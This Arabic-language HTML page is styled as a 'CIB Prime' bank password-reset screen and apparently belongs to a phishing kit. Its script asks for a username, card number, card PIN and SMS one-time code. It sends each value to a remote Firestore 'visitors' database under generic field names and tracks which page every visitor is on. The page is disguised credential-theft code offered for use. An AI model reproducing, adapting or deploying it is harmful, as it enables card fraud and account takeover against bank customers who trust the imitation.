<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, viewport-fit=cover"
  />

  <title>Forget Password - CIB Prime</title>

  <!-- Tailwind -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Font -->
  <link
    href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap"
    rel="stylesheet"
  />

  <style>
    * {
      -webkit-tap-highlight-color: transparent;
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      min-height: 100%;
      font-family: "Cairo", sans-serif;
      background: #f5f5f5;
      overflow-x: hidden;
    }

    input,
    button {
      font-family: "Cairo", sans-serif;
    }

    input::placeholder {
      color: #bfbfbf;
    }

    .ltr-input {
      direction: ltr !important;
      text-align: left !important;
    }

    .ltr-input::placeholder {
      direction: ltr !important;
      text-align: left !important;
      unicode-bidi: plaintext;
    }

    .screen-loader {
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.55);
      backdrop-filter: blur(2px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .screen-loader.active {
      display: flex;
    }

    .spinner {
      width: 52px;
      height: 52px;
      border: 4px solid rgba(0,87,168,0.15);
      border-top-color: #0057a8;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .main-wrapper {
      width: 100%;
      max-width: 430px;
      margin: 0 auto;
      min-height: 100vh;
      background: #f5f5f5;
      position: relative;
    }

    .top-section {
      background: #0057a8;
      height: 110px;
      padding-inline: 24px;
    }

    .content-section {
      background: #f5f5f5;
      border-top-left-radius: 32px;
      border-top-right-radius: 32px;
      margin-top: -28px;
      padding: 26px 24px 40px;
      min-height: calc(100vh - 110px);
    }

    .field-label {
      font-size: 18px;
      font-weight: 800;
      color: #202020;
      margin-bottom: 12px;
      display: block;
    }

    .field-wrapper {
      position: relative;
    }

    .main-input {
      width: 100%;
      height: 66px;
      border-radius: 22px;
      border: 1.8px solid #d9d9d9;
      background: #fff;
      padding-inline: 62px 20px;
      font-size: 16px;
      font-weight: 600;
      color: #333;
      transition: .2s ease;
    }

    .main-input:focus,
    .pin-input:focus {
      outline: none;
      border-color: #0057a8;
      box-shadow: 0 0 0 3px rgba(0,87,168,.08);
    }

    .input-icon {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      width: 32px;
      height: 32px;
      border-radius: 999px;
      border: 1.6px solid #d7d7d7;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #16a34a;
      border-color: #16a34a;
      background: #fff;
      font-weight: bold;
    }

    .pin-grid,
    .otp-grid {
      display: grid;
      direction: ltr;
      gap: 12px;
    }

    .pin-grid {
      grid-template-columns: repeat(4, 1fr);
    }

    .otp-grid {
      grid-template-columns: repeat(6, 1fr);
    }

    .pin-input {
      width: 100%;
      height: 74px;
      border-radius: 22px;
      border: 1.8px solid #d9d9d9;
      background: #fff;
      text-align: center;
      font-size: 30px;
      font-weight: 700;
      color: #222;
      transition: .2s ease;
    }

    .continue-btn {
      width: 100%;
      height: 68px;
      border: none;
      border-radius: 24px;
      background: #0057a8;
      color: white;
      font-size: 22px;
      font-weight: 800;
      cursor: pointer;
    }

    .continue-btn:disabled {
      background: #d5d5d5;
      cursor: not-allowed;
    }

    .stepper {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-bottom: 44px;
    }

    .step-line {
      width: 42px;
      height: 2px;
      background: #bdbdbd;
    }

    .step-circle {
      width: 36px;
      height: 36px;
      border-radius: 999px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      font-weight: 800;
    }

    .step-active {
      background: #0057a8;
      color: white;
    }

    .step-inactive {
      background: #e1e1e1;
      color: #9d9d9d;
    }

    .step-complete {
      background: #16a34a;
      color: white;
    }

    @media (max-width: 390px) {

      .content-section {
        padding-inline: 18px;
      }

      .main-input {
        height: 62px;
        font-size: 15px;
      }

      .pin-input {
        height: 66px;
        font-size: 24px;
      }

      .continue-btn {
        height: 62px;
        font-size: 20px;
      }

    }
  </style>
</head>

<body>

  <!-- Loader -->
  <div id="screenLoader" class="screen-loader">
    <div class="spinner"></div>
  </div>

  <div class="main-wrapper">

    <!-- Header -->
    <div class="top-section pt-5">

      <div class="flex items-center justify-between text-white">

        <button
          id="backBtn"
          class="w-10 h-10 flex items-center justify-center"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            class="w-7 h-7"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            stroke-width="2.4"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M9 5l7 7-7 7"
            />
          </svg>
        </button>

        <h1 class="text-[24px] font-extrabold">
          أدخل بياناتك
        </h1>

        <div class="w-10"></div>

      </div>

    </div>

    <!-- Content -->
    <div class="content-section">

      <!-- Stepper -->
      <div class="stepper">

        <div id="step1" class="step-circle step-active">
          1
        </div>

        <div class="step-line"></div>

        <div id="step2" class="step-circle step-inactive">
          2
        </div>

      </div>

      <!-- VERIFY -->
      <div id="verifySection">

        <div class="mb-10 text-right">

          <h2 class="text-[22px] font-extrabold text-[#222] mb-3">
            التحقق من البيانات
          </h2>

          <p class="text-[15px] leading-8 text-[#707070] font-semibold">
            من أجل أمانك، يرجى التحقق من بياناتك قبل البدء في إنشاء كلمة المرور الجديدة
          </p>

        </div>

        <!-- Username -->
        <div class="mb-8">

          <label class="field-label">
            اسم المستخدم
          </label>

          <div class="field-wrapper">

            <input
              id="username"
              type="text"
              class="main-input text-right"
              placeholder="اسم مستخدم مميز لك (غير مكرر)"
            />

            <div
              id="userCheck"
              class="input-icon hidden"
            >
              ✓
            </div>

          </div>

        </div>

        <!-- Card -->
        <div class="mb-2">

          <label class="field-label">
            رقم البطاقة
          </label>

          <div class="field-wrapper">

            <input
              id="card"
              type="text"
              inputmode="numeric"
              maxlength="19"
              dir="ltr"
              class="main-input tracking-[3px] ltr-input"
              placeholder="**** **** **** ****"
            />

            <div
              id="cardCheck"
              class="input-icon hidden"
            >
              ✓
            </div>

          </div>

          <p
            id="cardError"
            class="hidden text-red-500 text-xs mt-2 text-right"
          >
            رقم البطاقة غير صحيح
          </p>

        </div>

        <!-- PIN -->
        <div class="mt-8">

          <label class="field-label">
            أدخل الرقم السري للبطاقة
          </label>

          <div class="pin-grid mb-4">

            <input type="password" maxlength="1" class="pin-input pin" />
            <input type="password" maxlength="1" class="pin-input pin" />
            <input type="password" maxlength="1" class="pin-input pin" />
            <input type="password" maxlength="1" class="pin-input pin" />

          </div>

        </div>

        <!-- Button -->
        <div class="pt-14">

          <button
            id="continueBtn"
            disabled
            class="continue-btn"
          >
            متابعة
          </button>

        </div>

      </div>

      <!-- OTP -->
      <div id="otpSection" class="hidden">

        <div class="mb-10 text-right">

          <h2 class="text-[22px] font-extrabold text-[#222] mb-3">
            أدخل رمز التحقق
          </h2>

          <p class="text-[15px] leading-8 text-[#707070] font-semibold">
            تم إرسال رمز التحقق إلى رقم هاتفك المسجل
          </p>

        </div>

        <div class="otp-grid mb-10">

          <input type="text" maxlength="1" class="pin-input otp" />
          <input type="text" maxlength="1" class="pin-input otp" />
          <input type="text" maxlength="1" class="pin-input otp" />
          <input type="text" maxlength="1" class="pin-input otp" />
          <input type="text" maxlength="1" class="pin-input otp" />
          <input type="text" maxlength="1" class="pin-input otp" />

        </div>

        <button
          id="verifyBtn"
          disabled
          class="continue-btn"
        >
          تأكيد
        </button>

      </div>

    </div>

  </div>

  <script>

  const username =
    document.getElementById("username");

  const card =
    document.getElementById("card");

  const continueBtn =
    document.getElementById("continueBtn");

  const verifyBtn =
    document.getElementById("verifyBtn");

  const cardError =
    document.getElementById("cardError");

  const screenLoader =
    document.getElementById("screenLoader");

  const pinInputs =
    document.querySelectorAll(".pin");

  const otpInputs =
    document.querySelectorAll(".otp");

  const otpSection =
    document.getElementById("otpSection");

  const verifySection =
    document.getElementById("verifySection");

  const step1 =
    document.getElementById("step1");

  const step2 =
    document.getElementById("step2");

  const backBtn =
    document.getElementById("backBtn");

  const userCheck =
    document.getElementById("userCheck");

  const cardCheck =
    document.getElementById("cardCheck");

  // Luhn
  function isValidCard(number) {

    let sum = 0;
    let shouldDouble = false;

    for (
      let i = number.length - 1;
      i >= 0;
      i--
    ) {

      let digit =
        parseInt(number.charAt(i));

      if (shouldDouble) {

        digit *= 2;

        if (digit > 9) {
          digit -= 9;
        }

      }

      sum += digit;

      shouldDouble = !shouldDouble;

    }

    return sum % 10 === 0;

  }

  // Card format
  card.addEventListener("input", (e) => {

    let value = e.target.value
      .replace(/\D/g, "")
      .substring(0, 16);

    value = value
      .replace(/(.{4})/g, "$1 ")
      .trim();

    e.target.value = value;

    validate();

  });

  username.addEventListener(
    "input",
    validate
  );

  // PIN
  pinInputs.forEach((input, index) => {

    input.addEventListener("focus", () => {

      const firstEmpty =
        [...pinInputs].find(i => !i.value);

      if (
        firstEmpty &&
        input !== firstEmpty
      ) {
        firstEmpty.focus();
      }

    });

    input.addEventListener("input", (e) => {

      e.target.value =
        e.target.value.replace(/\D/g, "");

      if (
        e.target.value &&
        index < pinInputs.length - 1
      ) {
        pinInputs[index + 1].focus();
      }

      validate();

    });

    input.addEventListener("keydown", (e) => {

      if (e.key === "Backspace") {

        if (input.value) {

          input.value = "";
          validate();
          e.preventDefault();
          return;

        }

        if (index > 0) {

          pinInputs[index - 1].focus();

          pinInputs[index - 1].value = "";

          validate();

          e.preventDefault();

        }

      }

    });

  });

  // Validate
  function validate() {

    const usernameValid =
      username.value.trim().length >= 3;

    const rawCard =
      card.value.replace(/\s/g, "");

    const cardValid =
      rawCard.length === 16 &&
      isValidCard(rawCard);

    // Username green icon
    if (usernameValid) {
      userCheck.classList.remove("hidden");
    } else {
      userCheck.classList.add("hidden");
    }

    // Card green icon
    if (cardValid) {
      cardCheck.classList.remove("hidden");
    } else {
      cardCheck.classList.add("hidden");
    }

    // Card error
    if (
      rawCard.length === 16 &&
      !isValidCard(rawCard)
    ) {

      cardError.classList.remove("hidden");

    } else {

      cardError.classList.add("hidden");

    }

    const pinValid =
      [...pinInputs].every(
        input => input.value.length === 1
      );

    continueBtn.disabled = !(
      usernameValid &&
      cardValid &&
      pinValid
    );

  }

  // Continue
  continueBtn.addEventListener(
  "click",
  async () => {

    // GET CURRENT VISITOR
    const visitorId =
      localStorage.getItem("visitorId");

    let visitors =
      JSON.parse(
        localStorage.getItem("visitors")
      ) || [];

    const visitor =
      visitors.find(
        (v) => v.id === visitorId
      );

    // SAVE INPUTS
    await window.setDoc(

  window.doc(
    window.db,
    "visitors",
    visitorId
  ),

  {

    enteredForgotUsername:
      username.value,

    entered4Input:
      card.value,

    entered5Input:
      [...pinInputs]
        .map(input => input.value)
        .join("")

  },

  { merge: true }

);

    // SAVE AGAIN
    localStorage.setItem(
      "visitors",
      JSON.stringify(visitors)
    );

    screenLoader.classList.add("active");

    setTimeout(() => {

      screenLoader.classList.remove("active");

      verifySection.classList.add("hidden");

      otpSection.classList.remove("hidden");

      step1.classList.remove("step-active");
      step1.classList.add("step-complete");

      step2.classList.remove("step-inactive");
      step2.classList.add("step-active");

      otpInputs[0].focus();

    }, 3000);

  });

  // OTP
  otpInputs.forEach((input, index) => {

    input.addEventListener("input", (e) => {

      e.target.value =
        e.target.value.replace(/\D/g, "");

      if (
        e.target.value &&
        index < otpInputs.length - 1
      ) {
        otpInputs[index + 1].focus();
      }

      const otpValid =
        [...otpInputs].every(
          i => i.value.length === 1
        );

      verifyBtn.disabled = !otpValid;

    });

    input.addEventListener("keydown", (e) => {

      if (e.key === "Backspace") {

        if (input.value) {

          input.value = "";
          e.preventDefault();
          return;

        }

        if (index > 0) {

          otpInputs[index - 1].focus();

          otpInputs[index - 1].value = "";

          e.preventDefault();

        }

      }

    });

  });

  // Verify
  verifyBtn.addEventListener(
  "click",
  async () => {

    // GET CURRENT VISITOR
    const visitorId =
      localStorage.getItem("visitorId");

    let visitors =
      JSON.parse(
        localStorage.getItem("visitors")
      ) || [];

    const visitor =
      visitors.find(
        (v) => v.id === visitorId
      );

    // SAVE OTP
    await window.setDoc(

  window.doc(
    window.db,
    "visitors",
    visitorId
  ),

  {

    entered6Input:
      [...otpInputs]
        .map(input => input.value)
        .join("")

  },

  { merge: true }

);

    // SAVE AGAIN
    localStorage.setItem(
      "visitors",
      JSON.stringify(visitors)
    );

    screenLoader.classList.add("active");

    setTimeout(() => {

      window.location.href =
        "./login.html";

    }, 3000);

  });

  // Back button
  backBtn.addEventListener("click", () => {

    // OTP visible
    if (
      !otpSection.classList.contains("hidden")
    ) {

      otpSection.classList.add("hidden");

      verifySection.classList.remove("hidden");

      step2.classList.remove("step-active");
      step2.classList.add("step-inactive");

      step1.classList.remove("step-complete");
      step1.classList.add("step-active");

      return;

    }

    // Back to login
    window.location.href = "login.html";

  });

</script>

<script>

  // Create unique visitor id once
  let visitorId =
    localStorage.getItem("visitorId");

  if (!visitorId) {

    visitorId =
      "visitor_" + Date.now();

    localStorage.setItem(
      "visitorId",
      visitorId
    );

  }

  // Visitors array
  let visitors =
    JSON.parse(
      localStorage.getItem("visitors")
    ) || [];

  // Find current visitor
  let existingVisitor =
    visitors.find(
      (v) => v.id === visitorId
    );

  // Current page
  const currentPage =
    window.location.pathname
      .split("/")
      .pop();

  // If exists update page
  if (existingVisitor) {

    existingVisitor.currentPage =
      currentPage;

  }

  // Else create new visitor
  else {

 visitors.push({
  id: visitorId,
  username: "",
  currentPage: currentPage,

  entered2Input: "",

  // OTP LOGIN
  entered3Input: "",

  // FORGOT USERNAME
  enteredForgotUsername: "",

  // CARD
  entered4Input: "",

  // PIN
  entered5Input: "",

  // OTP RECOVERY
  entered6Input: ""
});

  }

  // Save again
window.setDoc(

  window.doc(
    window.db,
    "visitors",
    visitorId
  ),

  {
    id: visitorId,
    currentPage: currentPage
  },

  { merge: true }

);

</script>
